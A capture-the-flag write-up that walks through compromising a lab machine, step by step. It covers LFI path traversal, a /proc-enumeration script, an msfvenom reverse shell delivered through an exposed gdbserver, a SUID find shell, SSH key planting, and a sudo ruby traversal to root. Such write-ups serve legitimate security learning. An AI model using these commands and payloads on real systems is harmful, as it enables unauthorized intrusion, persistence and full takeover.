> Are you ready to fly?
#### Steps
1. Started out with an nmap scan `nmap -sV 10.10.101.33 -v`
2. Got the ports `22` and `8000`, ssh and http
3. Navigating to `10.10.101.33:8000`, I got redirected to `airplane.thm`
4. I added this to my host file for DNS resolution with:
```shell
sudo sh -c "echo '10.10.101.33 airplane.thm' >> /etc/hosts"
```
5. Navigating to the page, I found the page file specified with a page parameter -> `http://airplane.thm:8000/?page=index.html`
6. After checking source to make sure I didn't miss anything else, I modified the file path to grab `/etc/passwd`
```
http://airplane.thm:8000/?page=/../../../../etc/passwd
```
7. Easy LFI with no filters <333
8. From the file I found two users:
```
carlos:x:1000:1000:carlos,,,:/home/carlos:/bin/bash
hudson:x:1001:1001::/home/hudson:/bin/bash
```
9. I tried to use the same path traversal to read potential `user.txt` files in the home folders, but all I could find was a `.bashrc` file under hudsons directory (also I checked for ssh keys (`/.ssh/id_rsa`), there were none)
10. One interesting thing is the `carlos,,,` section of carlos's line the in the /etc/passwd file
11. This is the `GECOS` section, and the following commas just mean that phone number, email, etc parameters are empty
12. So relatively useless </3 (but hey new info to me)
13. I tried running `hydra` to bruteforce `ssh` with the new usernames, but I didn't have much luck
14. Going back to the site itself, I decided to run a scan on all ports `-p- -T5` to see if there were any other processes I missed
15. From this I found port `6048`
```
PORT     STATE SERVICE VERSION
6048/tcp open  x11?
```
16. Ok strange
17. My only guess was trying to find out what processes were running by checking files manually
18. All of this info is in the `/proc` directory
19. Most `/proc` subdirectories are PIDs (numbers) so automating requests shouldn't be too difficult
20. So I wrote a VERY barebones python script
```python
import requests

for pid in range(1, 1001):
    url = f"http://airplane.thm:8000/?page=/../../../../proc/{pid}/cmdline"
    try:
        res = requests.get(url, timeout=1) 
        print(pid, res.text)
    except requests.exceptions.RequestException as e:
        print(f"Error fetching PID {pid}: {e}")
```
21. Took about 5000000 years to run but it worked!
22. Interesting results:
```
374 avahi-daemon: running [airplane.local]
529 /usr/bin/gdbserver0.0.0.0:6048airplane
```
23. Looking into `gdbserver`
```
└─$ searchsploit gdbserver                                     
------------------------------------------------- ---------------------------------
 Exploit Title                                   |  Path
------------------------------------------------- ---------------------------------
GNU gdbserver 9.2 - Remote Command Execution (RC | linux/remote/50539.py
------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
24. I used metasploit to exploit this
```shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.2.13.251 LPORT=7777 PrependFork=true -f elf -o exploit.elf
```
25. Make it executable with `chmod +x` and run it with `gdb exploit.elf`
26. Then on gdb I ran `target extended-remote 10.10.101.33:6048`
27. Set up a netcat listener on port `7777` (or wtv you choose) then transfer over the shell
```
(gdb) remote put exploit.elf /tmp/exploit.elf
(gdb) set remote exec-file /tmp/exploit.elf
(gdb) run

└─$ nc -lvnp 7777 
listening on [any] 7777 ...
connect to [10.2.13.251] from (UNKNOWN) [10.10.166.15] 39078
whoami
hudson
```
28. Stabilize the shell `python3 -c 'import pty;pty.spawn("/bin/bash")'`
29. There nothing in hudsons dir so we have to move to carlos
30. No sudo -l (because no passwod) so I checked binary perms first
31. `/usr/bin/find` showed up which is exploitable (https://gtfobins.github.io/gtfobins/find/)
32. `find . -exec /bin/sh -p \; -quit`
33. From there navigate to carlos and grab user.txt
34. Next privilege escalation
35. To ssh as carlos:
```shell
# host machine
ssh-keygen

# rev shell
echo "your public key" >> /home/carlos/.ssh/authorized_keys
```
36. `ssh -i` with your private key file
37. Running `sudo -l`
```
carlos@airplane:~$ sudo -l
Matching Defaults entries for carlos on airplane:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User carlos may run the following commands on airplane:
    (ALL) NOPASSWD: /usr/bin/ruby /root/*.rb
```
38. gtfobins gives this command `ruby -e 'exec "/bin/sh"'` but since we can only run ruby files in the root directory there has to be a workaround
39. File traversal! (kinda)
```
carlos@airplane:~$ echo 'exec "/bin/sh"' >> /tmp/test.rb
carlos@airplane:~$ sudo ruby /root/../tmp/test.rb
# whoami
root
```
40. Done!
